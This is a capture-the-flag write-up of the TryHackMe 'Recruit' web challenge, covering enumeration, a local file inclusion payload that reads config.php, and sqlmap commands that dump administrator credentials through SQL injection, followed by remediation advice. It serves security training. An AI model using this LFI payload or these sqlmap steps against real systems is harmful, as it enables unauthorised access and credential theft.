# Recruit Challenge
*[Image: Banner]*

**Pathway:** *Jr Penetration Tester* | **Section:** *Web Application Vulnerabilities I* | **Challenge:** *[Recruit](https://tryhackme.com/room/recruitwebchallenge)*

> [!IMPORTANT]
> **Spoiler warning:** This writeup contains part of exploitation chain, however no flag codes are shown in this writeup!
>
> **Please note:** The IP addresses shown in this writeup were allocated during the TryHackMe lab, with the attack performed from my own Kali Linux VM using OpenVPN connected to the TryHackMe VPN.
>
> **License:** Unless otherwise stated, all writeups and documentation in this repository are licensed under [CC BY 4.0](https://creativecommons.org/licenses/by/4.0/). Any original scripts or code snippets are provided under the [MIT Licence](https://opensource.org/license/mit/).
> 
> This writeup uses several placeholders to avoid exposing lab-specific or sensitive information:
>
>: `<TARGET_IP>` - the IP address assigned to the target host when the TryHackMe machine is started.
>: `<TUN0_IP>` - the IP address assigned to my Kali Linux VM when connected to the TryHackMe VPN using OpenVPN.
>: `<REDACTED>` - information intentionally removed from the public writeup, such as flags, credentials, hashes or other challenge-sensitive values.
>
> This writeup reflects my own route through the challenge. Other learners may solve the room using different tools, commands or techniques. To preserve the integrity of the challenge and to act responsibly towards TryHackMe and the wider learning community, I choose what to redact from my public writeups unless I am asked by TryHackMe or another appropriate party to redact or remove additional material.

---

## About TryHackMe

This write-up was made possible by the hard work of the TryHackMe team and the wider cyber security community, who continue to create practical and engaging learning environments for aspiring security professionals.

[TryHackMe](http://www.tryhackme.com) is an online cyber security training platform that provides hands-on labs covering penetration testing, networking, web application security, privilege escalation and defensive security. Its rooms allow learners to develop practical technical skills within controlled and authorised environments.

## Lab Summary

The objective of this challenge was to assess the Recruit recruitment portal, obtain access as a normal HR user, identify an SQL injection vulnerability in the authenticated candidate search function, and recover the administrator credentials from the backend database.

Confirmed lab details used during the walkthrough:

    Target IP: <TARGET_IP>
    Kali tun0 IP: <TUN0_IP>
    Attacker working directory: /tmp/VK
    Application hostname: recruit.thm

## Tools Used

The main tools used were:

* `nmap` for initial service discovery.
* `curl` for inspecting web pages and testing the file retrieval endpoint.
* `feroxbuster` for web content discovery and the enumeration of exposed directories and files.
* `Burp Suite` for capturing the authenticated candidate search request.
* `sqlmap` for confirming and exploiting the SQL injection vulnerability.
* Standard Linux utilities such as `nano`, `cat`, `ls`, and `grep`.

Click [HERE](https://github.com/Valikahn/TryHackMe-Writeups#tools-commonly-used) to return to the repository README. Section `Tools Commonly Used` has all the links used and will be updated peredically with new tools if used or if links needs become 404.

## Initial Enumeration

The first step was to identify the services exposed by the target.

```bash
nmap -Pn -sC -sV -oN /tmp/VK/recruit_initial_nmap.txt <TARGET_IP>
```

The important findings were:

```text
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu
53/tcp open  domain  ISC BIND 9.16.1
80/tcp open  http    Apache httpd 2.4.41
```

The HTTP service returned the page title `Recruit`, confirming that the main attack surface was the web application on port 80.

## Updating the Hosts File

The application expected the hostname `recruit.thm`, so the Kali hosts file was updated before continuing.

```bash
echo "<TARGET_IP> recruit.thm" | sudo tee -a /etc/hosts
```

The mapping was confirmed using:

```bash
getent hosts recruit.thm
```

The VPN route and local tunnel interface were also checked:

```bash
ip route get <TARGET_IP>
ip -br address show tun0
```

This confirmed that traffic to the target was routed through `tun0` using the Kali VPN address `<TUN0_IP>`.

> [!TIP]
> When using your own Kali VM, the `/etc/hosts` file is especially important in these TryHackMe web challenges. Many rooms rely on hostname-based routing, virtual hosts, cookies, redirects or application logic that will not behave correctly if the hostname is missing. Over time, `/etc/hosts` can become cluttered with old lab entries, so it is advantageous to keep it clear, tidy and focused on the challenge currently being worked on. A messy hosts file is basically DNS spaghetti: technically edible, but nobody sensible wants it.

## Reviewing the Login Page and API Documentation

The homepage contained a login form and a link labelled `Access API`.

The page source was retrieved with:

```bash
curl -s http://recruit.thm/ | tee /tmp/VK/recruit_homepage.html
```

The HTML revealed the API documentation endpoint:

```text
/api.php
```

The endpoint was inspected with:

```bash
curl -i http://recruit.thm/api.php
```

The API documentation explained that candidate CVs could be fetched through:

```text
/file.php?cv=<URL>
```

It also stated that only certain locations were permitted, suggesting that the endpoint performed server-side file or URL retrieval.

## Discovering the Exposed Mail Log

After reviewing the login page and API documentation, additional web content discovery was performed with `feroxbuster`. The objective was to identify directories and files that were accessible on the server but were not linked directly from the application interface.

The following command was run:

```bash
feroxbuster -w /usr/share/wordlists/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt -u 'http://recruit.thm'
```

The command used the `DirBuster-2007_directory-list-2.3-medium.txt` wordlist from the local SecLists installation to recursively enumerate web content on `http://recruit.thm`.

The scan identified several accessible resources:

```text
/mail/
/mail/mail.log
/assets/
/javascript/
```

The most significant result was:

```text
http://recruit.thm/mail/mail.log
```

The mail log was publicly accessible without authentication and contained an internal deployment email. The information disclosed by the log included:

* The normal HR account username was `hr`.
* The HR password had been stored temporarily in `config.php`.
* Administrator credentials were stored in the application database rather than in the configuration file.

This disclosure established the next stage of the attack. By combining the exposed log information with the previously identified `/file.php?cv=<URL>` endpoint, it became possible to target the application configuration file and recover the HR password.

## Local File Inclusion

The `/file.php` endpoint accepted local file paths. The application configuration was retrieved with:

```text
http://recruit.thm/file.php?cv=file:///var/www/html/config.php
```

The PHP source was returned directly instead of being executed.

The configuration file disclosed the HR password:

```text
Username: hr
Password: <REDACTED>
```

This was a local file inclusion vulnerability because an attacker-controlled parameter allowed arbitrary local files to be read from the server.

## Logging In as the Normal User

The recovered credentials were used at:

```text
http://recruit.thm/
```

Credentials:

```text
Username: hr
Password: <REDACTED>
```

The login succeeded and opened the candidate applications dashboard.

Normal user flag:

```text
THM{....}
```

## Identifying SQL Injection

The HR dashboard contained a candidate search field.

Entering a single quotation mark produced a MySQL syntax error:

```text
SQL Error:
You have an error in your SQL syntax...
```

This confirmed that the `search` parameter was being inserted into an SQL query without safe parameterisation.

A normal search for `Alice` generated the following authenticated request:

```http
GET /dashboard.php?search=Alice HTTP/1.1
Host: recruit.thm
Cookie: PHPSESSID=<REDACTED>
```

The request was captured in Burp Suite and saved to:

```text
/tmp/VK/request.txt
```

The saved request included the full authenticated HTTP request and the active `PHPSESSID` cookie.
## Exploiting the SQL Injection with sqlmap

The request file was tested with `sqlmap`:

```bash
cd /tmp/VK
sqlmap -r request.txt -p search --dbs
```

`sqlmap` confirmed that the backend database management system was MySQL and returned the available databases:

```text
information_schema
mysql
performance_schema
phpmyadmin
recruit_db
sys
```

The application database was `recruit_db`.

The database tables were enumerated with:

```bash
sqlmap -r request.txt -D recruit_db --tables
```

The following tables were identified:

```text
candidates
users
```

The `users` table was dumped with:

```bash
sqlmap -r request.txt -D recruit_db -T users --dump
```

The extracted record was:

```text
Username: admin
Password: <REDACTED>
```

The SQL injection therefore allowed an authenticated low-privileged user to read sensitive data from the backend database, including administrator credentials.

## Logging In as Administrator

The HR session was ended and the administrator credentials were used on the main login page.

Credentials:

```text
Username: admin
Password: <REDACTED>
```

The login succeeded and opened the administrator version of the candidate applications dashboard. The administrator interface included additional actions for approving and rejecting candidates.

Administrator flag:

```text
THM{....}
```

## Full Attack Chain Recap

### 1. Service discovery

`nmap` identified SSH, DNS, and an Apache web application on port 80.

### 2. Hostname configuration

The following entry was added to `/etc/hosts` so the application hostname resolved correctly:

```text
<TARGET_IP> recruit.thm
```

### 3. Web enumeration

The public API documentation disclosed the `/file.php?cv=<URL>` endpoint, while content discovery located an exposed mail log.

### 4. Information disclosure

The mail log disclosed the HR username and revealed that the password was stored in `config.php`.

### 5. Local file inclusion

The vulnerable file endpoint was used to retrieve:

```text
file:///var/www/html/config.php
```

This exposed the HR password.

### 6. Normal user access

The recovered HR credentials provided authenticated access and revealed the normal-user flag.

### 7. Authenticated SQL injection

The candidate search parameter produced a MySQL syntax error. An authenticated request was saved from Burp Suite and tested with `sqlmap`.

### 8. Database extraction

`sqlmap` enumerated `recruit_db`, identified the `users` table, and extracted the administrator credentials.

### 9. Administrator access

The recovered credentials were used to log in as the administrator and retrieve the final flag.

## Key Lessons

This challenge demonstrated several important web application security weaknesses:

* Exposed log files can disclose internal usernames, file locations, deployment details, and credential storage practices.
* Local file inclusion can expose application source code and sensitive configuration files.
* Hard-coded credentials create a direct route to account compromise.
* SQL syntax errors can reveal unsafe query construction.
* Authenticated functionality must be tested with the same care as public endpoints.
* SQL injection can allow a low-privileged user to extract administrator credentials and escalate privileges.
* Session cookies must be preserved when testing authenticated endpoints with tools such as `sqlmap`.

## Remediation Notes

The vulnerabilities in this lab could be mitigated by:

* Removing mail logs, deployment records, backups, and configuration files from the web root.
* Preventing directory listing and restricting access to internal operational files.
* Removing hard-coded credentials from source code and configuration files.
* Storing secrets in a protected secrets-management system or environment variables outside the web root.
* Replacing the file retrieval function with a strict allow-list of approved remote locations.
* Rejecting local paths and dangerous URI schemes such as `file://`, `php://`, and related wrappers.
* Canonicalising and validating paths before accessing files.
* Using prepared statements and parameterised queries for every database operation.
* Returning generic error messages rather than exposing raw database errors.
* Applying least privilege to the database account used by the application.
* Storing passwords using a modern adaptive password hashing algorithm rather than plaintext.
* Requiring secure session cookie attributes, including `HttpOnly`, `Secure`, and an appropriate `SameSite` policy.
* Performing regular authenticated application security testing.

## Disclaimer

This writeup is intended solely for education, training and documentation of an authorised TryHackMe lab.

All tools, commands, payloads and post-exploitation techniques described here were used within a controlled environment provided by TryHackMe. Permission to interact with the target was granted by the platform owner and operator as part of the room.

The tools and methods documented in this walkthrough represent one successful approach. They are not the only possible techniques, and alternative tools or workflows may produce the same result.

Never test, scan, exploit or access a system without clear and explicit authorisation from its owner.

---
[!["Buy Me A Coffee"](https://www.buymeacoffee.com/assets/img/custom_images/orange_img.png)](https://buymeacoffee.com/v4l1k4hn)  

**Powered on ☕ made with ❤️ by [V4L1K4HN](https://tryhackme.com/p/V4L1K4HN)**  
⭐ If this project is useful, consider starring it on GitHub.
